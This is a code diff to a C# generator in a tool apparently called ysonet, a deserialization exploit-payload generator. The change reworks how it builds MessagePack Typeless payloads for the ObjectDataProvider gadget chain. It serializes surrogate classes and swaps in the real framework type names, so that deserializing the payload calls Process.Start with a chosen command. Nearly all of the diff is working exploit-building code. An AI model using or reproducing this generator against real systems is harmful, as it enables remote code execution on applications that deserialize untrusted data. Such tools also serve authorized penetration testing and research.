@@ -752,41 +752,86 @@ namespace ysonet.Generators
                     return serializedData;
                 }
             }
-            else if (formatter.ToLowerInvariant().Equals("messagepacktypeless") || formatter.ToLowerInvariant().Equals("messagepacktypelesslz4"))
+            else if (IsMessagePackTypeless(formatter))
             {
-                if (formatter.ToLowerInvariant().Equals("messagepacktypeless"))
-                {
-                    var serializedData = MessagePackObjectDataProviderHelper.CreateObjectDataProviderGadget(inputArgs.CmdFileName, inputArgs.CmdArguments, false);
+                byte[] serializedData = BuildMessagePackTypeless(
+                    inputArgs.CmdFileName,
+                    inputArgs.CmdArguments,
+                    IsMessagePackLz4(formatter));
 
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            MessagePackObjectDataProviderHelper.Test(serializedData, false);
-                        }
-                        catch { }
-                    }
-                    return serializedData;
-                }
-                else // LZ4
+                if (inputArgs.Test)
                 {
-                    var serializedData = MessagePackObjectDataProviderHelper.CreateObjectDataProviderGadget(inputArgs.CmdFileName, inputArgs.CmdArguments, true);
-
-                    if (inputArgs.Test)
+                    try
                     {
-                        try
-                        {
-                            MessagePackObjectDataProviderHelper.Test(serializedData, true);
-                        }
-                        catch { }
+                        MessagePackTypelessTypeSwap.Deserialize(serializedData, IsMessagePackLz4(formatter));
                     }
-                    return serializedData;
+                    catch { }
                 }
+                return serializedData;
             }
             else
             {
                 throw new Exception("Formatter not supported");
             }
+        }
+
+        // The MessagePack Typeless encoding of this chain. Building the real graph would call
+        // ObjectDataProvider's method inside ysonet, so serialize the surrogate graph below and
+        // have MessagePack write the three framework type names instead of the surrogate ones.
+        // MessagePack >= 2.3.75.
+        private static byte[] BuildMessagePackTypeless(string cmdFileName, string cmdArguments, bool useLz4)
+        {
+            var graph = new ObjectDataProviderSurrogate
+            {
+                MethodName = "Start",
+                ObjectInstance = new ProcessSurrogate
+                {
+                    StartInfo = new ProcessStartInfoSurrogate
+                    {
+                        FileName = cmdFileName,
+                        Arguments = cmdArguments
+                    }
+                }
+            };
+
+            // Only the two members that are DECLARED as object need a name: MessagePack
+            // Typeless writes a type name exactly where the static type is object (the root
+            // here, and ObjectInstance), and writes a bare map everywhere else. StartInfo is
+            // declared as its own concrete type, so no name is written for it and none is
+            // needed - the target resolves it from the real Process.StartInfo property type.
+            // Locked by MessagePackTypelessCarriesTargetTypeNames.
+            var targetTypeNames = new Dictionary<Type, string>
+            {
+                {
+                    typeof(ObjectDataProviderSurrogate),
+                    "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
+                },
+                {
+                    typeof(ProcessSurrogate),
+                    "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+                }
+            };
+
+            return MessagePackTypelessTypeSwap.SerializeAs(graph, targetTypeNames, useLz4);
+        }
+
+        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites each
+        // type name to the framework type in the map above before the payload leaves ysonet.
+        internal sealed class ObjectDataProviderSurrogate
+        {
+            public string MethodName { get; set; }
+            public object ObjectInstance { get; set; }
+        }
+
+        internal sealed class ProcessSurrogate
+        {
+            public ProcessStartInfoSurrogate StartInfo { get; set; }
+        }
+
+        internal sealed class ProcessStartInfoSurrogate
+        {
+            public string FileName { get; set; }
+            public string Arguments { get; set; }
         }
     }
 }
